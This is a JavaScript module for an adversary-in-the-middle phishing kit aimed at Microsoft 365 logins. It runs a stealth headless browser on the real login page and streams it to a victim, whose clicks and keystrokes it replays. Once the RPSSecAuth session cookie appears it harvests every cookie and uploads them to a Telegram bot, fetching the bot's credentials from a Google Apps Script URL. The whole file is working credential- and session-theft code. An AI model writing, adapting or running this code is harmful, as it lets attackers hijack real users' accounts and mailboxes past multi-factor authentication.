const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

// Your Dynamic Vault URL
const VAULT_URL = "https://script.googleusercontent.com/macros/echo?user_content_key=AWDtjMUqhClgfeFlU8Xv_oX6N6eXj3l7lbyNcSkwxk-JkstXJYafiVNpdDBlT452ND7spqv7p3eQRXoD5LOsTDGcSZA1g4RX8v7GLHXuLucT81tg9au9CEbNP55X9hLIOqMSQh8Fc-taJut7HXkZiFO464jKxJCrfrUaLuqfE4rZyHPFdaXwlPY9wZwfTHjcYK33eMIoLp_eyKW2KspfnYAk2Xx6dbBVNjIOCTUS9di8QeEHoSra82-uqH8Wrl5yHTXorlXRxsCYZa4-wO_EOwajrh3mg7KUNQ&lib=MycdviQl2tpQGpak5QfXFV5l1jq1QWbX2";
const TARGET = "https://login.microsoftonline.com/";

async function getVault() {
    try {
        const response = await axios.get(VAULT_URL, { timeout: 8000 });
        if (response.data && response.data.TG_TOKEN) return response.data;
    } catch (e) { console.log("!! VAULT ERROR: Check Google Script Deployment !!"); }
    return null;
}

async function sendExfiltration(cookies, url) {
    const creds = await getVault();
    if (!creds) return;

    const host = new URL(url).hostname;
    try {
        // Step 1: Text Alert
        await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendMessage`, {
            chat_id: creds.TG_CHAT_ID,
            text: `<b>🚨 MATURE SESSION CAPTURED</b>\n<b>Domain:</b> ${host}\n<b>Tokens:</b> ${cookies.length}\n<b>Key:</b> RPSSecAuth (Verified)`,
            parse_mode: 'HTML'
        });

        // Step 2: Full Cookie Jar File
        const form = new FormData();
        form.append('chat_id', creds.TG_CHAT_ID);
        form.append('document', Buffer.from(JSON.stringify(cookies, null, 2)), {
            filename: `VERIFIED_${host.replace(/\./g, '_')}.json`,
            contentType: 'application/json'
        });

        await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders()
        });
    } catch (e) { console.log("!! TELEGRAM FAILURE !!"); }
}

async function startSession(io, socket) {
    let browser = null;
    let captured = false;

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-blink-features=AutomationControlled',
                '--disable-features=IsolateOrigins,site-per-process' // Crucial for cross-domain cookie visibility
            ]
        });

        const [page] = await browser.pages();
        // CDP Session bypasses Puppeteer's high-level domain restrictions
        const cdp = await page.target().createCDPSession();
        
        await page.setViewport({ width: 1280, height: 720 });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36');

        await page.goto(TARGET, { waitUntil: 'networkidle2' });

        // --- THE "MATURITY" MONITOR ---
        const monitor = setInterval(async () => {
            if (captured) return;

            try {
                // Pull EVERYTHING from the browser memory
                const { cookies } = await cdp.send('Network.getAllCookies');
                const url = page.url();

                // Validation: Does the God Cookie exist?
                const hasSessionKey = cookies.some(c => c.name === 'RPSSecAuth');
                const isMailbox = url.includes('outlook') || url.includes('mail') || url.includes('portal');

                if (hasSessionKey && isMailbox) {
                    captured = true; // One-time trigger
                    
                    // Final delay to allow background POST requests to finish writing tokens
                    setTimeout(async () => {
                        const finalResult = await cdp.send('Network.getAllCookies');
                        await sendExfiltration(finalResult.cookies, page.url());
                    }, 5000);
                }
            } catch (e) {}
        }, 5000);

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') {
                    await page.mouse.move(data.x, data.y);
                    await page.mouse.click(data.x, data.y);
                } else if (data.type === 'key') {
                    await page.keyboard.press(data.key);
                }
            } catch (e) {}
        });

        const stream = setInterval(async () => {
            if (socket.connected) {
                try {
                    const b64 = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 20 });
                    socket.emit('browser-render', { screenshot: b64 });
                } catch (e) {}
            }
        }, 1200);

        socket.on('disconnect', async () => {
            clearInterval(monitor);
            clearInterval(stream);
            if (browser) await browser.close();
        });

    } catch (err) { if (browser) await browser.close(); }
}

module.exports = { startSession };
